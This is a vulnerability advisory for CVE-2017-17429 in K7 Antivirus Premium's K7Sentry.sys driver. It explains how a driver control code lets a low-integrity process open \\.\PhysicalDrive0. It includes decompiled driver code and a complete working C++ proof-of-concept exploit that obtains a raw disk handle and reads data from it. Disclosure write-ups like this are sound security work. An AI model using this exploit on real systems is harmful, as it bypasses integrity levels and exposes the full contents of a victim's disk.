# CVE-2017-17429

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7Sentry.sys 15.1.0.45*

# Details
The control code 0x950026D8 ultimately allows you pass a string to IoCreateFileSpecifyDeviceObjectHint (from kernel mode) and the opened handle will be passed back to the calling process, and is a handle that can be used in that user mode process. If the calling thread is part of the administrator group it will return a RW handle, otherwise it will return a read-only handle.

However, this means that a LOW integrity process, can talk to the driver, and open a handle to \\??\\PhysicalDrive0 and have complete read access to the entire contents of the hard disk which is a Confidentiality issue.

```C++
switch ( dwIoControlCode )
{
    // ...
    case 0x950026D8:
        v9 = IoControl_0x950026D8_CreateFileIfAdmin(&stIoControlBuffer);
        goto LABEL_117;
```

```C++
int __stdcall IoControl_0x950026D8_CreateFileIfAdmin(IoControlBuffer *a1)
{
    // ...
    // Locals
    // ...

    dwInLength = a1->dwInputBufferLength;
    FileHandle = 0;
    if ( dwInLength >= 0x10 && a1->dwOutputBufferLength >= 4u )
    {
        pInputBuffer = (unk15 *)a1->pInputBuffer;
        dwSomeFlag = pInputBuffer->field_0;
        v4 = &pInputBuffer->pszSomething;
        if ( !*(&pInputBuffer->pszSomething + ((dwInLength - 6) >> 1)) )
        {
            if ( !(dwSomeFlag & 0x20000002) )
                // Take this jmp...
                goto LABEL_30;

            // ... removed for simplicity ...

            if ( bIsAdmin )
            {
            LABEL_30:
                // ... land here...
                RtlInitUnicodeString(&DestinationString, v4);
                oa.Length = 24;
                oa.RootDirectory = 0;
                oa.Attributes = 64;
                oa.ObjectName = &DestinationString; // This has come directly from the user
                oa.SecurityDescriptor = 0;
                oa.SecurityQualityOfService = 0;

                // ...
                // Setup the desired access based off various flags, we can only get FILE_GENERIC_READ
                // ...

                IoStatusBlock = 0;
                v13 = 0;
                CreateOptions = 2912;
                if ( dwSomeFlag & 0x20000000 )
                    CreateOptions = 7008;
                
                // VULN: This will open the file specified by the string in my input buffer and 
                // return the handle to the output buffer.
                if ( !IoCreateFileSpecifyDeviceObjectHint(
                        &FileHandle,
                        DesiredAccess,
                        &oa,
                        &IoStatusBlock,
                        0,
                        FILE_ATTRIBUTE_NORMAL,
                        ShareAccess,
                        1,
                        CreateOptions,
                        0,
                        0,
                        0,
                        0,
                        2048,
                        0)
                    && FileHandle
                    && FileHandle != -1 )
                {
                    // Handle passed back via output buffer.
                    *(_DWORD *)a1->pOutputBuffer = FileHandle;
                    *a1->pdwIoStatusInformation = 4;
                }
            }
        }
    }
    return 0;
}
```

# PoC Code

The following PoC code demonstrates this and uses this control code to get a handle to *\\??\\PhysicalDrive0* and then proceeds to read data from it to demonstrate it. This can be run in a LOW integrity process.

```C++
VOID RawDiskAccessFromLow()
{
	HANDLE 	hDevice = CreateFileW(L"\\\\.\\k7sentry", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	BYTE arrInput[0x1000] = { 0 };
	BYTE arrOutput[0x1000] = { 0 };
	DWORD dwBytesReturned = 0;

	PDWORD pdwStart = (PDWORD)arrInput;
	*pdwStart = 1 | 0x10 | 0x20;
	wcscpy_s((WCHAR*)(arrInput + 4), 100, L"\\??\\PhysicalDrive0");

	if (!DeviceIoControl(hDevice, 0x950026D8, arrInput, sizeof(arrInput), arrOutput, sizeof(arrOutput), &dwBytesReturned, NULL))
	{
		printf("Error: DeviceIoControl 0x%08x\r\n", GetLastError());
		return;
	}

	DWORD dwTest = *((PDWORD)arrOutput);
	printf("Value: 0x%08x\r\n", dwTest);

	HANDLE hDrive = (HANDLE)dwTest;

	// Move it 256MB into the drive - probably a partition here
	if (SetFilePointer(hDrive, 0x10000000, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
	{
		printf("Error: Couldn't set file pointer\r\n");
		return;
	}

	BYTE cluster[0x1000] = { 0 };

	for (DWORD i = 0; i < 0x10000; ++i)
	{
		if (!ReadFile(hDrive, cluster, sizeof(cluster), &dwBytesReturned, NULL) ||
			dwBytesReturned != sizeof(cluster))
		{
			printf("Error: ReadFile failed: 0x%08x\r\n", GetLastError());
			return;
		}
	}

	printf("\r\n");
}

```
